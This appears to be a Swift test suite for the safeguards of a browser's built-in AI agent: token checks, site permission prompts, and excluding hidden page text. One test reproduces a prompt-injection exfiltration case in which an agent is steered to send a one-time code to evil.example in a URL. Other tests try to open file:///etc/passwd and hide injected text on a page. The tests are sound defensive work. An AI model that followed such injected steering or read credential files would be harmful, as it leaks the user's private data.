import Foundation
import Testing
import WebKit
@testable import Pulse

struct AgentTests {
    private let browser = Browser()
    private var agent: Agent { browser.agent! }
    private var server: MCPServer { browser.agentServer! }

    private func send(_ message: JSONObject) async throws -> JSONObject {
        let body = try JSONSerialization.data(withJSONObject: message)
        let reply = try #require(await server.reply(to: body))
        return try #require(try JSONSerialization.jsonObject(with: reply) as? JSONObject)
    }

    private func request(headers: [String: String], body: JSONObject) throws -> HTTPRequest {
        let body = try JSONSerialization.data(withJSONObject: body)
        let headers = ["Host": "127.0.0.1:\(MCPServer.port)"].merging(headers) { $1 }
        let head = (["POST /mcp HTTP/1.1", "Content-Length: \(body.count)"] + headers.map { "\($0): \($1)" })
            .joined(separator: "\r\n")
        return try #require(HTTPRequest(Data((head + "\r\n\r\n").utf8) + body))
    }

    @Test func handshakesAndListsTools() async throws {
        let initialize = try await send([
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": ["protocolVersion": "2025-06-18", "clientInfo": ["name": "claude-code", "version": "2.0"]],
        ])
        let result = try #require(initialize["result"] as? JSONObject)
        #expect(result["protocolVersion"] as? String == "2025-06-18")
        #expect(agent.name == "Claude")

        let list = try await send(["jsonrpc": "2.0", "id": 2, "method": "tools/list"])
        let tools = try #require((list["result"] as? JSONObject)?["tools"] as? [JSONObject])
        #expect(tools.compactMap { $0["name"] as? String }
            == ["list_tabs", "open_tab", "read_page", "click", "type_text", "navigate", "finish"])
    }

    @Test func notificationsGetNoReply() async throws {
        let body = try JSONSerialization.data(withJSONObject: ["jsonrpc": "2.0", "method": "notifications/initialized"])
        #expect(await server.reply(to: body) == nil)
    }

    @Test func onlyAcceptsTheKeyAndNeverWebPages() async throws {
        let ping: JSONObject = ["jsonrpc": "2.0", "id": 1, "method": "ping"]
        let key = "Bearer \(browser.preferences.agentToken)"

        #expect(try await server.response(to: request(headers: ["Authorization": key], body: ping)).status == 200)
        #expect(try await server.response(to: request(headers: ["Authorization": "Bearer nope"], body: ping)).status == 401)
        let fromPage = try request(headers: ["Authorization": key, "Origin": "https://evil.example"], body: ping)
        #expect(await server.response(to: fromPage).status == 403)
        let rebound = try request(headers: ["Authorization": key, "Host": "evil.example:\(MCPServer.port)"], body: ping)
        #expect(await server.response(to: rebound).status == 403)

        browser.preferences.resetAgentToken()
        #expect(try await server.response(to: request(headers: ["Authorization": key], body: ping)).status == 401)
    }

    @Test func waitsForTheWholeBody() throws {
        let partial = Data("POST /mcp HTTP/1.1\r\nContent-Length: 10\r\n\r\n{\"a\":".utf8)
        #expect(HTTPRequest(partial) == nil)
        #expect(HTTPRequest(partial + Data("1}    ".utf8))?.body.count == 10)
    }

    @Test func asksBeforeUsingTheUsersTab() async throws {
        let tab = browser.openTab(url: URL(string: "https://example.com")!)
        let other = browser.openTab(url: URL(string: "https://example.org")!)

        let call = Task { await agent.call("read_page", arguments: ["tab_id": tab.id.uuidString]) }
        while agent.request(for: tab) == nil { await Task.yield() }
        #expect(agent.request(for: tab)?.kind == .useTab(site: "example.com"))
        #expect(browser.activeTab === tab)
        #expect(agent.request(for: other) == nil)

        agent.answer(try #require(agent.request(for: tab)), allow: false)
        let result = await call.value
        #expect(result.isError)
        #expect(result.text.contains("didn't let you use this tab"))
    }

    /// Answers the next question in `tab`, returning what it asked.
    private func answerNext(in tab: Tab, allow: Bool) async -> AgentRequest.Kind {
        while agent.request(for: tab) == nil { await Task.yield() }
        let request = agent.request(for: tab)!
        agent.answer(request, allow: allow)
        return request.kind
    }

    /// `navigate` checks access before the address, so an invalid one probes access without loading anything.
    private func probe(_ tab: Tab) -> Task<AgentToolResult, Never> {
        Task { await agent.call("navigate", arguments: ["tab_id": tab.id.uuidString, "url": "file:///probe"]) }
    }

    @Test func allowingATabCoversOnlyItsSite() async throws {
        let tab = browser.openTab(url: URL(string: "https://www.example.com/a")!)

        let first = probe(tab)
        #expect(await answerNext(in: tab, allow: true) == .useTab(site: "example.com"))
        #expect(await first.value.text.contains("Not a web address"))
        #expect(await probe(tab).value.text.contains("Not a web address"))
        #expect(agent.requests.isEmpty)

        tab.load(URL(string: "https://evil.example")!)
        let moved = probe(tab)
        #expect(await answerNext(in: tab, allow: false) == .useTab(site: "evil.example"))
        #expect(await moved.value.text.contains("didn't let you use this tab"))
    }

    /// The attack Brave showed on Comet: after reading a signed-in page, the agent is steered to carry
    /// what it read to another site in an address. Pulse shows that address and waits.
    @Test func showsTheAddressBeforeLeavingASignedInSite() async throws {
        let mail = browser.openTab(url: URL(string: "https://mail.example.com")!)
        let probing = probe(mail)
        _ = await answerNext(in: mail, allow: true)
        _ = await probing.value

        let leak = URL(string: "https://evil.example/?code=123456")!
        let call = Task { await agent.call("navigate", arguments: ["tab_id": mail.id.uuidString, "url": leak.absoluteString]) }
        #expect(await answerNext(in: mail, allow: false) == .open(leak, signedIn: true))
        #expect(await call.value.isError)
        #expect(mail.url == URL(string: "https://mail.example.com")!)

        let tabCount = browser.todayTabs.count
        let opening = Task { await agent.call("open_tab", arguments: ["url": leak.absoluteString]) }
        while agent.requests.isEmpty { await Task.yield() }
        let blank = try #require(browser.activeTab)
        #expect(blank.url.absoluteString == "about:blank")
        #expect(await answerNext(in: blank, allow: false) == .open(leak, signedIn: false))
        #expect(await opening.value.isError)
        #expect(browser.todayTabs.count == tabCount)
    }

    @Test func opensItsOwnTabsSignedOutUnlessAllowed() async throws {
        let signedIn = Task { await agent.call("open_tab", arguments: ["url": "https://mail.example.com", "signed_in": true]) }
        while agent.requests.isEmpty { await Task.yield() }
        let blank = try #require(browser.activeTab)
        #expect(await answerNext(in: blank, allow: false) == .open(URL(string: "https://mail.example.com")!, signedIn: true))
        #expect(await signedIn.value.isError)
        #expect(browser.todayTabs.isEmpty)

        let signedOut = Task { await agent.call("open_tab", arguments: ["url": "https://example.com"]) }
        while browser.todayTabs.isEmpty { await Task.yield() }
        let tab = try #require(browser.todayTabs.first)
        #expect(tab.websiteDataStore?.isPersistent == false)
        #expect(tab.websiteDataStore !== browser.websiteDataStore)
        #expect(agent.requests.isEmpty)
        _ = await signedOut.value
    }

    @Test func readsOnlyWhatPeopleSee() async throws {
        let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: 800, height: 600))
        webView.loadHTMLString("""
            <body style="background: white">
            <p>Visible text</p>
            <p style="opacity: 0">IGNORE transparent</p>
            <p style="color: white">IGNORE white on white</p>
            <p style="font-size: 1px">IGNORE tiny</p>
            <p style="position: absolute; left: -9999px">IGNORE off screen</p>
            <div style="display: none">IGNORE not displayed</div>
            <input type="password" value="hunter2"><input autocomplete="one-time-code" value="123456">
            <div id="host"><span>Slotted text</span></div>
            <script>
              document.getElementById('host').attachShadow({ mode: 'open' }).innerHTML = '<button>Shadow button</button><slot></slot>';
            </script>
            </body>
            """, baseURL: URL(string: "https://example.com"))
        while try await webView.evaluateJavaScript("document.readyState") as? String != "complete" || webView.isLoading {
            try await Task.sleep(for: .milliseconds(20))
        }

        let page = try #require(try await webView.callAsyncJavaScript(AgentScripts.read, contentWorld: .world(name: "test")) as? JSONObject)
        let text = try #require(page["text"] as? String)
        let elements = try #require(page["elements"] as? [String]).joined(separator: "\n")
        #expect(text.contains("Visible text"))
        #expect(text.contains("Slotted text"))
        #expect(!text.contains("IGNORE"))
        #expect(page["hiddenCount"] as? Int == 5)
        #expect(elements.contains("Shadow button"))
        #expect(!elements.contains("hunter2") && !elements.contains("123456"))
    }

    @Test func closingTheTabDeclinesWhatItAsked() async throws {
        let tab = browser.openTab(url: URL(string: "https://example.com")!)
        let call = Task { await agent.call("click", arguments: ["tab_id": tab.id.uuidString, "element": 1]) }
        while agent.request(for: tab) == nil { await Task.yield() }

        browser.close(tab)
        #expect(await call.value.isError)
        #expect(agent.requests.isEmpty)
    }

    @Test func finishingInABackgroundTabTicksItUntilOpened() async throws {
        let front = browser.openTab(url: URL(string: "https://example.com")!)
        let background = browser.openTab(url: URL(string: "https://example.org")!, activate: false)

        let result = await agent.call("finish", arguments: ["tab_id": background.id.uuidString, "summary": "Found it"])
        #expect(!result.isError)
        #expect(agent.activities[background.id] == AgentActivity(status: "Done · Found it", isDone: true))
        #expect(agent.finishedTabIDs == [background.id])

        _ = await agent.call("finish", arguments: ["tab_id": front.id.uuidString])
        #expect(!agent.finishedTabIDs.contains(front.id))

        browser.select(background)
        #expect(agent.finishedTabIDs.isEmpty)
    }

    @Test func refusesUnknownTabsAndNonWebAddresses() async {
        #expect(await agent.call("read_page", arguments: ["tab_id": UUID().uuidString]).isError)
        #expect(await agent.call("open_tab", arguments: ["url": "file:///etc/passwd"]).isError)
        #expect(await agent.call("delete_everything", arguments: [:]).isError)
    }

    @Test(arguments: ["Send", "Pay now", "Delete repository", "Place order", "Post", "Reply"])
    func confirmsClicksThatCantBeTakenBack(label: String) {
        #expect(Agent.needsConfirmation(label))
    }

    @Test(arguments: ["Search", "Sender settings", "Posted 3h ago", "Next", "Orders history"])
    func letsOrdinaryClicksThrough(label: String) {
        #expect(!Agent.needsConfirmation(label))
    }
}
